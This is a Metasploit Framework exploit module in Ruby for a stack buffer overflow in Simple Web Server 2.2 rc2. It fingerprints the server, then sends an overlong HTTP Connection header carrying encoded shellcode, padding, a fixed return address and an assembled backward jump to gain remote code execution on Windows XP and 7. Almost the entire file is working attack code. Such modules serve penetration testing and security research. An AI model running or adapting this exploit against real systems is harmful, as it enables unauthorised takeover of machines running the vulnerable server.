##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	HttpFingerprint = { :pattern => [ /PMSoftware-SWS/ ] }

	include Msf::Exploit::Remote::HttpClient

	def initialize(info={})
		super(update_info(info,
			'Name'        => "Simple Web Server Connection Header Buffer Overflow",
			'Description' => %q{
				This module exploits a vulnerability in Simple Web Server 2.2 rc2. A remote user
				can send a long string data in the Connection Header to causes an overflow on the
				stack when function vsprintf() is used, and gain arbitrary code execution. The
				module has been tested successfully on Windows 7 SP1 and Windows XP SP3.
			},
			'License'	  => MSF_LICENSE,
			'Author'      =>
				[
					'mr.pr0n', # Vulnerability Discovery and PoC
					'juan' # Metasploit module
				],
			'References' =>
				[
					['EDB', '19937'],
					['URL', 'http://ghostinthelab.wordpress.com/2012/07/19/simplewebserver-2-2-rc2-remote-buffer-overflow-exploit/']
				],
			'Payload'	 =>
				{
					'BadChars' => "\x00\x0a\x0d",
					'Space' => 2048,
					'DisableNops' => true,
					'PrependEncoder' => "\x81\xC4\x60\xF0\xFF\xFF", # add esp, -4000
				},
			'DefaultOptions' =>
				{
					'EXITFUNC' => "process",
				},
			'Platform' => 'win',
			'Targets'  =>
				[
					[
						'SimpleWebServer 2.2-rc2 / Windows XP SP3 / Windows 7 SP1',
						{
							'Ret' => 0x6fcbc64b, # call edi from libstdc++-6.dll
							'Offset' => 2048,
							'OffsetEDI' => 84
						}
					]
				],
			'Privileged'     => false,
			'DisclosureDate' => "Jul 20 2012",
			'DefaultTarget'  => 0))
	end

	def check
		res = send_request_raw({'uri'=>'/'})
		if res and res.headers['Server'] =~ /PMSoftware\-SWS\/2\.[0-2]/
			return Exploit::CheckCode::Vulnerable
		end

		return Exploit::CheckCode::Safe
	end

	def exploit

		sploit = payload.encoded
		sploit << rand_text(target['Offset'] - sploit.length)
		sploit << [target.ret].pack("V") # eip
		sploit << rand_text(target['OffsetEDI'])
		sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-#{sploit.length}").encode_string

		print_status("Trying target #{target.name}...")

		connect

		send_request_cgi({
			'uri'        => '/',
			'version'    => '1.1',
			'method'     => 'GET',
			'connection' => sploit
		})

		disconnect

	end
end
